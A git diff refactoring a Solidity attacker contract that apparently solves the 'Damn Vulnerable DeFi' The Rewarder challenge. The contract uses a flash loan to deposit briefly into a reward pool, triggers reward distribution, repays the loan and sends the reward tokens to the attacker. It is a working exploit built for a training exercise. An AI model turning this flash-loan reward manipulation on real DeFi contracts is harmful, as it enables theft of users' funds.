@@ -4,7 +4,6 @@ pragma solidity 0.8.12;
 import {Address} from "openzeppelin-contracts/utils/Address.sol";
 import {RewardToken} from "./RewardToken.sol";
 import {DamnValuableToken} from "../DamnValuableToken.sol";
-import {AccountingToken} from "./AccountingToken.sol";
 
 interface IFlashLoanReceiver {
     function receiveFlashLoan(uint256 amount) external;
@@ -14,22 +13,14 @@ interface IFlashLoanReceiver {
     error SenderIsNotOwner();
 }
 
-interface ITheRewarderPool {
-    function deposit(uint256 amountToDeposit) external;
-
-    function distributeRewards() external returns (uint256);
-
-    function withdraw(uint256 amountToWithdraw) external;
-}
-
 contract FlashLoanReceiver {
     using Address for address;
 
     address private _attacker;
     address private _flashLoanerPool;
     address private _rewarderPool;
-    address private _dvt;
-    address private _rewardTokenAddress;
+    DamnValuableToken private _dvt;
+    RewardToken private _rewardToken;
 
     error SenderIsNotFlashLoanerPool();
     error SenderIsNotOwner();
@@ -45,8 +36,8 @@ contract FlashLoanReceiver {
         _attacker = msg.sender;
         _flashLoanerPool = flashLoanerPool;
         _rewarderPool = rewarderPool;
-        _dvt = dvtAddress;
-        _rewardTokenAddress = rewardTokenAddress;
+        _dvt = DamnValuableToken(dvtAddress);
+        _rewardToken = RewardToken(rewardTokenAddress);
     }
 
     function attack(uint256 amount) external {
@@ -58,15 +49,13 @@ contract FlashLoanReceiver {
 
     function receiveFlashLoan(uint256 amount) external {
         if (msg.sender != _flashLoanerPool) revert SenderIsNotFlashLoanerPool();
-        if (!DamnValuableToken(_dvt).approve(_rewarderPool, amount))
-            revert CallFailed();
+        if (!_dvt.approve(_rewarderPool, amount)) revert CallFailed();
 
         _rewarderPool.functionCall(
             abi.encodeWithSignature("deposit(uint256)", amount)
         );
 
-        if (DamnValuableToken(_dvt).balanceOf(address(this)) > 0)
-            revert("deposit failed");
+        if (_dvt.balanceOf(address(this)) > 0) revert("deposit failed");
 
         _rewarderPool.functionCall(
             abi.encodeWithSignature("distributeRewards()")
@@ -75,14 +64,10 @@ contract FlashLoanReceiver {
             abi.encodeWithSignature("withdraw(uint256)", amount)
         );
 
-        if (!DamnValuableToken(_dvt).transfer(_flashLoanerPool, amount))
-            revert TransferFail();
+        if (!_dvt.transfer(_flashLoanerPool, amount)) revert TransferFail();
 
-        uint256 rewards = RewardToken(_rewardTokenAddress).balanceOf(
-            address(this)
-        );
+        uint256 rewards = RewardToken(_rewardToken).balanceOf(address(this));
 
-        if (!RewardToken(_rewardTokenAddress).transfer(_attacker, rewards))
-            revert TransferFail();
+        if (!_rewardToken.transfer(_attacker, rewards)) revert TransferFail();
     }
 }
